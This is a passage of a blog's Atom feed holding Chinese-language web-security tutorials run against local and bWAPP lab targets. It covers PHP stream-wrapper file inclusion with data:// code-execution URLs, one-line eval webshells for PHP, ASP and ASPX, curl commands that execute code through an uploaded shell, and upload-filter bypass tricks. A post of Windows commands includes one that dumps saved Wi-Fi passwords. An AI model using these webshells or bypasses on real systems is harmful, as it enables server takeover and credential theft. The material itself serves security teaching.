title="php伪协议"></a>php伪协议</h3><ul><li><p>条件：</p><p>  allow_url_fopen:off/on</p><p>  allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</p></li><li><p>作用：php:// 访问各个输入/输出流（I/O streams），</p></li></ul><p>经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><h3 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h3><ul><li><p>条件<br>  allow_url_fopen:off/on</p><p>  allow_url_include :off/on</p></li><li><p>作用</p><p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</p></li><li><p>示例</p><p> 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h3><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure></p><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h3><ul><li><p>条件<br>  allow_url_fopen:on</p><p>  allow_url_include:on</p></li><li><p>作用</p><p>  自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p>示例</p><p>data://text/plain,</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p> data://text/plain;base64,</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h3 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a>http:// &amp; https:// 协议</h3></li><li><p>条件<br>  allow_url_fopen:on</p><p>  allow_url_include:on</p></li><li><p>作用</p><p>  常规 URL形式，允许通过<code>HTTP 1.0</code>的 GET方法，以只读访问文件或资源。通常用于远程包含。</p></li><li><p>示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h2&gt;&lt;p&gt;程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被</summary>
+      
+    
+    
+    
+    
+    <category term="伪协议、文件包含" scheme="http://yejuns.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之文件上传漏洞</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-25T08:05:54.708Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="文件上传漏洞是什么？"><a href="#文件上传漏洞是什么？" class="headerlink" title="文件上传漏洞是什么？"></a>文件上传漏洞是什么？</h2><p>关键字：绕过</p><p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。</p><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>在bwapp中选择文件上传漏洞的bug模式，</p><p>然后借助<code>eval</code>函数，制做一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据</span></span><br></pre></td></tr></table></figure><p>文件上传成功后，我们可以得到这个文件的地址：<br><a href="http://192.168.50.136/images/shell.php">http://192.168.50.136/images/shell.php</a></p><p>因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php</span><br><span class="line">2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php</span><br></pre></td></tr></table></figure><p>PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录</p><p>当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用<code>中国菜刀</code>。</p><h2 id="常用的一些一句话木马"><a href="#常用的一些一句话木马" class="headerlink" title="常用的一些一句话木马"></a>常用的一些一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;  <span class="comment">#asp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[“value”]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;  <span class="comment">#aspx</span></span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;value&quot;</span>])%&gt; </span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure><h2 id="文件上传漏洞的绕过"><a href="#文件上传漏洞的绕过" class="headerlink" title="文件上传漏洞的绕过"></a>文件上传漏洞的绕过</h2><p>上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制</p><p>我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。</p><p><img src="..%5Cimgs%5Cweb%5Cfile-upload-1.png" alt="上传失败"></p><p>我们只需要将<code>shell.php</code>改名为<code>shell.php3</code>，然后就可以正常上传，<br>和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilesMatch <span class="string">&quot;.+\.ph(p[345]?|t|tml)$&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。</p><h2 id="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："><a href="#大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：" class="headerlink" title="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："></a>大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：</h2><p>Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。</p><p>漏洞利用流程：</p><ol><li>上传shell.php.test；</li><li>访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。</li></ol><h3 id="1、前端验证绕过"><a href="#1、前端验证绕过" class="headerlink" title="1、前端验证绕过"></a>1、前端验证绕过</h3><p><code>原因</code>：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。</p><p>漏洞利用流程（两种方法都可以）:</p><ol><li>通过Burp Suite抓包，然后修改内容后放行。</li><li>通过Chrome禁止/删除JavaScript代码.</li></ol><h3 id="2、-htaccess绕过"><a href="#2、-htaccess绕过" class="headerlink" title="2、.htaccess绕过"></a>2、.htaccess绕过</h3><p>.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p><p>场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的<code>黑名单</code>过滤。</p><h3 id="3、大小写绕过"><a href="#3、大小写绕过" class="headerlink" title="3、大小写绕过"></a>3、大小写绕过</h3><p>如果我们想上传一个php木马，那么我们可以上传一个pHp即可</p><h3 id="4、windows文件流特性绕过"><a href="#4、windows文件流特性绕过" class="headerlink" title="4、windows文件流特性绕过"></a>4、windows文件流特性绕过</h3><p>NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。</p><h3 id="5、-00截断绕过"><a href="#5、-00截断绕过" class="headerlink" title="5、%00截断绕过"></a>5、%00截断绕过</h3><p>即对于白名单的方式，如何绕过？</p><p>可以对上传的文件名中加入十六进制的<code>00</code>，这样就可以将test.php.png截断成test.php。</p><h3 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h3><p>我们可以拼接png与php文件，尝试执行。</p><p>需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;文件上传漏洞是什么？&quot;&gt;&lt;a href=&quot;#文件上传漏洞是什么？&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞是什么？&quot;&gt;&lt;/a&gt;文件上传漏洞是什么？&lt;/h2&gt;&lt;p&gt;关键字：绕过&lt;/p&gt;
+&lt;p&gt;文件上传漏洞是在开发者没有做充足验证（包括前端，</summary>
+      
+    
+    
+    
+    
+    <category term="xss、攻击" scheme="http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows常用命令</title>
+    <link href="http://yejuns.github.io/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <id>http://yejuns.github.io/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-20T07:11:48.110Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="进程相关"><a href="#进程相关" class="headerlink" title="进程相关"></a>进程相关</h2><h3 id="查看指定端口的使用情况（就可以获取端口上运行程序的PID）"><a href="#查看指定端口的使用情况（就可以获取端口上运行程序的PID）" class="headerlink" title="查看指定端口的使用情况（就可以获取端口上运行程序的PID）"></a>查看指定端口的使用情况（就可以获取端口上运行程序的PID）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 端口号</span><br></pre></td></tr></table></figure><h3 id="获取到PID后，就查看进程详细信息"><a href="#获取到PID后，就查看进程详细信息" class="headerlink" title="获取到PID后，就查看进程详细信息"></a>获取到PID后，就查看进程详细信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr 进程号</span><br></pre></td></tr></table></figure><p>就可以知道启动该进程的程序，比如java.exe，然后使用任务管理器将其关闭</p><h3 id="执行此命令强制关闭指定进程号的进程（类似linux中的kill）"><a href="#执行此命令强制关闭指定进程号的进程（类似linux中的kill）" class="headerlink" title="执行此命令强制关闭指定进程号的进程（类似linux中的kill）"></a>执行此命令强制关闭指定进程号的进程（类似linux中的<code>kill</code>）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill -PID 进程号 -F </span><br></pre></td></tr></table></figure><h2 id="查看wifi密码"><a href="#查看wifi密码" class="headerlink" title="查看wifi密码"></a>查看wifi密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile * key=clear</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;进程相关&quot;&gt;&lt;a href=&quot;#进程相关&quot; class=&quot;headerlink&quot; title=&quot;进程相关&quot;&gt;&lt;/a&gt;进程相关&lt;/h2&gt;&lt;h3 id=&quot;查看指定端口的使用情况（就可以获取端口上运行程序的PID）&quot;&gt;&lt;a href=&quot;#查看指定端口的使用情况（就可以获</summary>
+      
+    
+    
+    
+    
+    <category term="windows，指令" scheme="http://yejuns.github.io/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/"/>
+    
+  </entry>
+  
+</feed>
